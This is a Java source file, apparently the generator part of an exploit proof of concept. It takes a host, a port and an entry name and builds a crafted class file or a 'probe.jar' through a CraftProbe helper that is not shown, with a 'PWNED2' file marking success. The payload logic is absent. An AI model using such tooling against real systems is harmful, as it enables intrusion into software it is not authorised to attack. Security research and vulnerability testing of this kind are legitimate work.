import java.io.File;

public class Gen {
    public static void main(String[] args) throws Exception {
        // Usage A: java Gen <internal-class-name> <output-class-file>
        // Usage B: java Gen --port 18080 --host localhost --out probe.jar
        if (args.length == 2 && !args[0].startsWith("--")) {
            String internalName = args[0];
            String outputFile = args[1];
            String pwned = System.getProperty("poc.pwnedFile", "PWNED2");
            java.nio.file.Files.write(java.nio.file.Paths.get(outputFile), CraftProbe.craftClass(internalName, pwned));
            System.out.println("crafted class written to " + outputFile);
            return;
        }

        int port = Integer.getInteger("poc.port", 18080);
        String host = System.getProperty("poc.hostToken", "localhost");
        String entry = System.getProperty("poc.entry", "POC");
        String pwned = System.getProperty("poc.pwnedFile", "PWNED2");
        File out = new File(System.getProperty("poc.probeJar", "probe.jar"));

        for (int i = 0; i < args.length; i++) {
            if ("--port".equals(args[i]) && i + 1 < args.length) {
                port = Integer.parseInt(args[++i]);
            } else if ("--out".equals(args[i]) && i + 1 < args.length) {
                out = new File(args[++i]);
            } else if ("--host".equals(args[i]) && i + 1 < args.length) {
                host = args[++i];
            } else if ("--entry".equals(args[i]) && i + 1 < args.length) {
                entry = args[++i];
            }
        }

        byte[] jar = CraftProbe.writeProbeJar(out, host, port, entry, pwned);
        System.out.println("crafted probe jar: " + out.getAbsolutePath() + " (" + jar.length + " bytes)");
        System.out.println("internalName: " + CraftProbe.internalName(host, port, entry));
        System.out.println("typeName: " + CraftProbe.typeName(host, port, entry));
    }
}
